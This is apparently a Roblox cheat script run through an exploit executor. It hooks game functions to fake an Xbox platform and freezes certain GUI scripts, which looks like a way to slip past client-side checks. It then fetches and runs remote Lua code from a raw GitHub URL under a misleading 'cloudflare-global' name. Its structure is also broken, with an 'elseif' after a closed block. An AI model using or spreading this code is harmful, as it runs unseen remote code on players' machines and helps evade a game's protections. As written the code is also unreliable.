queue_on_teleport([=[
if game.PlaceId == 10179538382 then
    local UserInputService = game:GetService("UserInputService")
    local GuiService = game:GetService("GuiService")

    local OldNamecall
    OldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
        local Method = getnamecallmethod()

        if Method == "IsTenFootInterface" then
            return true
        elseif Method == "GetPlatform" then
            return Enum.Platform.XBoxOne
        end

            local Traceback = debug.traceback()
            if Traceback:match("PlayerGui") then
                local lp = game:GetService("Players").LocalPlayer
                local SourceName = Traceback:gsub(
                    string.format("Players.%s.PlayerGui.", lp.Name),
                    ""
                )
                if SourceName:len() > 32 then
                    return task.wait(9e9)
                end
            end

        return OldNamecall(self, ...)
    end))

    pcall(function()
        local OldIsTenFootInterface
        OldIsTenFootInterface = hookfunction(GuiService.IsTenFootInterface, newcclosure(function(self)
            if not checkcaller() then
                return true
            end
            return OldIsTenFootInterface(self)
        end))
    end)
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/d4e6f8a0b2c4d6e8f0a2c4e6f8a0b2c4d6/cloudflare-global/refs/heads/main/gilaigla.lua"))()

elseif game.PlaceId == 13643807539 then
repeat task.wait() until not game.ReplicatedFirst:FindFirstChild("Intro")
        game:GetService("ScriptContext"):SetTimeout(9e9)
end
]=])
